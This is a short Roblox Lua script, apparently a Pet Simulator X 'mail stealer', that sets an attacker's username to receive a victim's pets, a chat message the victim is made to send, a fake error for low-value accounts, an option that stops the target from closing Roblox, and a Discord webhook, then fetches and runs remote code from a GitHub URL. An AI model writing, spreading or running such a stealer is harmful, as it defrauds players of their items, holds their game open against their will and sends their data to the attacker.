
_G.Username = "ABC" --// Username To Send Pets To
_G.GiftMessage = "DEFG" --// Message For The Gift To Say
_G.SendMessage = "HIJKL" --// Message the victim will send in the chat on execution
_G.Diamonds = 1000 --// Amount Of Diamonds To detect alt set an amount of diamond that if the target is under this number, the script will show them an error
_G.UnlockPets = true --// Unlocks Locked Pets
_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
_G.Webhook = "https://webhook.com/" --// Discord Webhook URL
loadstring(game:HttpGet("https://raw.githubusercontent.com/GadoScripts/PetSimulatorX/main/mailstealer.lua"))()
